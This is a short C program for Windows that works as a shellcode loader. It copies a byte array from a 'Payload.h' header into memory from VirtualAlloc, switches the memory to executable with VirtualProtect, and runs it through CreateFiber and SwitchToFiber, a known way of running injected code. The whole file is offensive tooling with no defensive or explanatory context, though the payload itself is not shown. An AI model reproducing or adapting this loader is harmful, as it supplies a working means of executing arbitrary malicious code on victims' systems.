#include <windows.h>
#include <stdio.h>
#include "Payload.h"


int main( void ) {
    LPVOID exec_mem = VirtualAlloc( NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( exec_mem == NULL ) {
        fprintf( stderr, "[-] VirtualAlloc failed: %d\n", GetLastError() );
        return 0;
    }
    printf( "[+] Allocated %ld bytes at %p\n", payloadSize, exec_mem );

    memcpy( exec_mem, payload, payloadSize );

    DWORD oldProtect = 0;

    if ( !VirtualProtect( exec_mem, payloadSize, PAGE_EXECUTE_READ, &oldProtect ) ) {
        fprintf( stderr, "[-] VirtualProtect failed: %d\n", GetLastError() );
        return 0;
    }

    LPVOID self = ConvertThreadToFiber( NULL );
    LPVOID newFiber = CreateFiber( 0, ( LPFIBER_START_ROUTINE )exec_mem, NULL );

    SwitchToFiber( newFiber );

    DeleteFiber( newFiber );
    ConvertFiberToThread();

    return 0;
}